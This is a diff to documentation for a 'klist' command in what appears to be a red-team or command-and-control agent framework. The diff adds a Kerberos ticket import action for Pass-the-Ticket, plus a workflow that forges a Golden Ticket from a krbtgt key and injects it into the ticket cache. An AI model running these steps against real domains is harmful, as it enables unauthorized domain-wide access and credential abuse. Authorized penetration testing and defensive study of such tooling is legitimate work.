@@ -7,18 +7,20 @@ hidden = false
 
 ## Summary
 
-Enumerate, filter, dump, and purge Kerberos tickets from the current logon session's ticket cache.
+Enumerate, filter, dump, purge, and import Kerberos tickets. Supports Pass-the-Ticket (T1550.003) by injecting forged or extracted tickets into the ticket cache.
 
-On **Windows**, uses the LSA (Local Security Authority) API via `secur32.dll` to interact with the Kerberos authentication package directly. Supports listing cached tickets with metadata, dumping tickets as base64-encoded kirbi for pass-the-ticket, and purging the ticket cache.
+On **Windows**, uses the LSA (Local Security Authority) API via `secur32.dll` to interact with the Kerberos authentication package directly. Supports listing cached tickets with metadata, dumping tickets as base64-encoded kirbi, purging the ticket cache, and importing kirbi tickets via `KERB_SUBMIT_TKT_REQUEST`.
 
-On **Linux/macOS**, parses the Kerberos ccache file (typically `/tmp/krb5cc_<uid>` or as specified by `$KRB5CCNAME`). Supports v3 and v4 ccache formats. Purge deletes the ccache file. Dump exports the entire ccache as base64.
+On **Linux/macOS**, parses the Kerberos ccache file (typically `/tmp/krb5cc_<uid>` or as specified by `$KRB5CCNAME`). Supports v3 and v4 ccache formats. Purge deletes the ccache file. Dump exports the entire ccache as base64. Import writes a ccache file and sets `KRB5CCNAME`.
 
 ## Arguments
 
 Argument | Required | Description
 ---------|----------|------------
-action | No | Action to perform: `list` (default), `purge`, or `dump`
+action | No | Action to perform: `list` (default), `purge`, `dump`, or `import`
 server | No | Filter tickets by server name (substring match, e.g., `krbtgt`)
+ticket | No | Base64-encoded ticket data for import (kirbi on Windows, ccache on Linux/macOS)
+path | No | Output path for import on Linux/macOS (default: `/tmp/krb5cc_<uid>`)
 
 ## Usage
 
@@ -40,6 +42,33 @@ klist -action dump
 Purge all cached tickets:
 ```
 klist -action purge
+```
+
+Import a ticket for Pass-the-Ticket (use output from `ticket` command):
+```
+klist -action import -ticket <base64_ccache_data>
+```
+
+Import with custom path:
+```
+klist -action import -ticket <base64> -path /tmp/custom_ccache
+```
+
+### Forge + Import Workflow
+
+1. Forge a Golden Ticket:
+```
+ticket -action forge -realm DOMAIN.COM -username admin -domain_sid S-1-5-21-... -key <krbtgt_key> -format ccache
+```
+
+2. Copy the base64 output and import it:
+```
+klist -action import -ticket <base64_from_step_1>
+```
+
+3. Verify the imported ticket:
+```
+klist -action list
 ```
 
 ## Example Output
